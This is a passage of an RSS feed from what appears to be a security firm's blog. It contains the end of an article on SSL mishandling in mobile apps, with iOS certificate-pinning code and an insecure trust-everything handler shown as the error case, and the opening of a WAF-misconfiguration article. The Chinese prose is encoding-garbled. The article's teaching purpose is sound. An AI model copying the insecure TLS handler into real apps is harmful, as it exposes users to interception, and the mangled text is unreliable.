    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;è™•ç†æ–¹å¼èˆ‡å‰é¢çš„ Android æƒ…æ³2é¡åŒï¼Œåšäº† certificate pinningã€‚&lt;/p&gt;

&lt;h4 id=&quot;ios-éŒ¯èª¤è™•ç†æƒ…æ³3&quot;&gt;iOS éŒ¯èª¤è™•ç†æƒ…æ³3&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URLSession&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;didReceiveChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeDisposition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                              &lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;NSURLProtectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengePerformDefaultHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;èˆ‡å‰é¢ NSURLConnection çš„æƒ…æ³é¡åŒï¼Œåªæ˜¯é€™è£¡ä½¿ç”¨åˆ°çš„æ˜¯ iOS7  æ–°å¢çš„ NSURLSession å…ƒä»¶ã€‚å°æ‡‰çš„è™•ç†æ–¹å¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URLSession&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;didReceiveChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeDisposition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                              &lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;authenticationMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OSStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustEvaluate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errSecSuccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
                                                   &lt;span class=&quot;nl&quot;&gt;pathForResource:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;random-org&quot;&lt;/span&gt;
                                                            &lt;span class=&quot;nl&quot;&gt;ofType:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;der&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]];&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__bridge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CFRelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengePerformDefaultHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;å°-webview-çš„ä¸€äº›è£œå……&quot;&gt;å° WebView çš„ä¸€äº›è£œå……&lt;/h4&gt;
&lt;p&gt;åœ¨å° WebView åšè™•ç†ä¸Šï¼Œé™¤äº†å° SSL éŒ¯èª¤ç›´æ¥ç•¥éå¤–ï¼Œç›®å‰ç„¡è«–æ˜¯åœ¨ Android é‚„æ˜¯ iOS ä¸Šï¼ŒSDK API éƒ½å°šæœªç›´æ¥æä¾›æ–¹æ³•è®“é–‹ç™¼è€…èƒ½åœ¨ SSL Handshake çš„é€”ä¸­ä½œ Server Certificate Pinningã€‚å…¶ä¸­ä¸€å€‹æ›¿ä»£æ–¹æ³•æ˜¯ï¼Œåˆ©ç”¨å…¶ä»–èƒ½å¤ ä½œ Pinning çš„å…ƒä»¶å°‡è³‡æ–™ä¸‹è¼‰å›ä¾†ï¼Œæ¥è‘—æŠŠè³‡æ–™å‚³åˆ° WebView é€²è¡Œè®€å–ï¼Œé¿é–‹åŸæœ¬ç”¨ WebView ç›´æ¥è¨­å®šé€£ç·šç¶²å€ã€‚è˜‹æœå…¬å¸æœ‰æä¾›é€™ç¨®è™•ç†çš„&lt;a href=&quot;https://developer.apple.com/library/ios/samplecode/CustomHTTPProtocol/Introduction/Intro.html&quot;&gt;ç¯„ä¾‹&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;çµèª&quot;&gt;çµèª&lt;/h3&gt;
&lt;p&gt;æœ¬ä¾†ç‚ºäº†æé«˜å®‰å…¨æ€§è€Œä½¿ç”¨çš„ SSL åŠ å¯†é€£ç·šï¼Œå»ç”±æ–¼ç¨‹å¼è™•ç†ä¸ç•¶è®“åŸä¾†çš„ä¿è­·å½¢åŒè™›è¨­ã€‚è§€å¿µä¸è¶³èˆ‡ç‚ºç¯€çœæ™‚é–“è€Œæ²’åšå¥½è™•ç†ç›¸ä¿¡æ˜¯ä¸»è¦åŸå› ã€‚ç¶²è·¯ä¸Šå¤§é‡çš„æ–‡ç« åœ¨å¼•æŒ‡é–‹ç™¼è€…ç•¥ééŒ¯èª¤è­¦å‘Šçš„æ™‚å€™ï¼Œå»æ²’æœ‰æé†’ä»–å€‘é€™æ¨£åšå¸¶ä¾†çš„å½±éŸ¿ï¼Œä¹ŸåŠ©é•·äº†ä¸ç•¶è™•ç†çš„ç™¼ç”Ÿã€‚&lt;/p&gt;

&lt;p&gt;é™¤äº† SSL è™•ç†å•é¡Œå¤–ï¼Œæ‰‹æ©Ÿæ‡‰ç”¨ç¨‹å¼é–‹ç™¼é‚„æœ‰è¨±å¤šè¦æ³¨æ„çš„å®‰å…¨å•é¡Œï¼Œåƒæ˜¯ OWASP åˆ—å‡ºçš„ &lt;a href=&quot;https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks&quot;&gt;Top 10 Mobile Risks&lt;/a&gt;ã€ç”±æ—¥æœ¬æ™ºæ…§å‹æ‰‹æ©Ÿå®‰å…¨å”æœƒç™¼ä½ˆ &lt;a href=&quot;http://www.jssec.org/report/android_securecoding_en_20140801.html&quot;&gt;Android Application Secure Design/Secure Coding Guidebook&lt;/a&gt; è£¡é¢æ‰€å»ºè­°çš„ã€‚é–‹ç™¼å•†æœ‰è²¬ä»»åšå¥½å®‰å…¨æŠŠé—œä»¥ä¿éšœé›™æ–¹æ¬Šç›Šã€‚&lt;/p&gt;

&lt;h3 id=&quot;åƒè€ƒ&quot;&gt;åƒè€ƒ&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://android-ssl.org&quot;&gt;Rethinking SSL Development in an Appified World&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://android-developers.blogspot.com/2012/03/unifying-key-store-access-in-ics.html&quot;&gt;Unifying Key Store Access in ICS | Android Developers Blog&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://commonsware.com/blog/2013/03/04/ssl-android-basics.html&quot;&gt;The CommonsBlog â€” SSL on Android: The Basics&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.android.com/training/articles/security-ssl.html&quot;&gt;Security with HTTPS and SSL | Android Developers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/librarY/mac/documentation/NetworkingInternet/Conceptual/NetworkingTopics/Articles/OverridingSSLChainValidationCorrectly.html&quot;&gt;Networking Programming Topics: Overriding TLS Chain Validation Correctly&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/library/ios/technotes/tn2232/_index.html&quot;&gt;Technical Note TN2232: HTTPS Server Trust Evaluation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning&quot;&gt;Certificate and Public Key Pinning - OWASP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;Google åŸºæ–¼æ•ˆèƒ½åŠæœ‰æ•ˆæ€§çš„è€ƒé‡ï¼Œåœ¨ Android ç³»çµ±ä¸Šé è¨­åœç”¨&lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=68643&quot;&gt;æ†‘è­‰æ’¤éŠ·æª¢æŸ¥&lt;/a&gt;&lt;br /&gt;Â &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;OWASP çš„ Android ç¯„ä¾‹ä¸­ï¼Œå…§å«çš„ PUB_KEY æ˜¯éŒ¯èª¤çš„ (æœ€å¾Œæ›´æ”¹æ—¥æœŸ 2014/08/14)Â &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/</link>
                <guid>https://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development</guid>
                <pubDate>Fri, 15 Aug 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>è¨­å‚™ä¸è‰¯è¨­å®šå¸¶ä¾†çš„å®‰å…¨é¢¨éšªï¼šä»¥ WAF ç‚ºä¾‹</title>
                <description>&lt;p&gt;éå»è«‡åˆ°ç¶²ç«™å®‰å…¨ï¼Œé€šå¸¸æœƒä½¿ç”¨é˜²ç«ç‰†æˆ– IDS é€²è¡Œé˜²è­·ã€‚ä½†è¿‘å¹´ä¾†ç¶²ç«™å®‰å…¨è­°é¡Œéƒ½æ˜¯ä»¥ç¶²é æ‡‰ç”¨ç¨‹å¼çš„æ¼æ´å±…å¤šï¼Œç„¡æ³•å–®é é˜²ç«ç‰†é˜»æ“‹ã€‚ä»¥ OWASP Top 10 2013 çš„ç¬¬ä¸€å Injection è€Œè¨€ï¼Œå¤šåŠæ˜¯ç¨‹å¼æ’°å¯«æ–¹æ³•ä¸åš´è¬¹æ‰€é€ æˆï¼Œå› æ­¤æ‰æœ‰äº†ç¶²é æ‡‰ç”¨ç¨‹å¼é˜²ç«ç‰† (Web Application Firewall, WAF) çš„å‡ºç¾ã€‚&lt;/p&gt;

&lt;p&gt;æœ‰äº† WAF å°±æ˜¯è¬éˆä¸¹äº†å—ï¼Ÿå°±ç®—æœ‰å„ç¨®è³‡å®‰è¨­å‚™ï¼Œä½†ç¼ºä¹å®‰å…¨çš„è¨­å®šï¼Œæœ‰çš„æ™‚å€™åè€Œæœƒè®“ç³»çµ±é™·å…¥å®‰å…¨é¢¨éšªä¸­ã€‚æˆ‘å€‘å°±ä»¥ Reverse Proxy æˆ– WAF è¨­å‚™ä¾†æ¢è¨ä¸ä½³è¨­å®šå¸¶ä¾†çš„å®‰å…¨é¢¨éšªã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;waf-æ­é…ä¸ä½³çš„è¨­å®šæœƒå¸¶ä¾†ä»€éº¼å±å®³&quot;&gt;WAF æ­é…ä¸ä½³çš„è¨­å®šæœƒå¸¶ä¾†ä»€éº¼å±å®³ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ä»¥å¸¸è¦‹çš„ mod_proxy æ­é… mod_security çš„æ–¹æ¡ˆä¾†çœ‹ï¼Œé€šå¸¸ä½¿ç”¨ Reverse Proxy æˆ– Transparent Proxy ç‚ºå…¶æ¶æ§‹ï¼Œé€é Proxy çš„æ–¹å¼åœ¨ Client èˆ‡ Web Server ä¹‹é–“ï¼Œå° HTTP Request / Response é€²è¡Œéæ¿¾ï¼›ä»¥ HTTP Request ç‚ºä¾‹ï¼Œç•¶ WAF åµæ¸¬åˆ° Client ç«¯çš„è«‹æ±‚ä¸­æœ‰ SQL Injection èªæ³•æ™‚å€™ï¼Œå°‡æœƒé˜»æ–·é€™å€‹é€£ç·šé˜²æ­¢é§­å®¢æ”»æ“Šã€‚&lt;/p&gt;

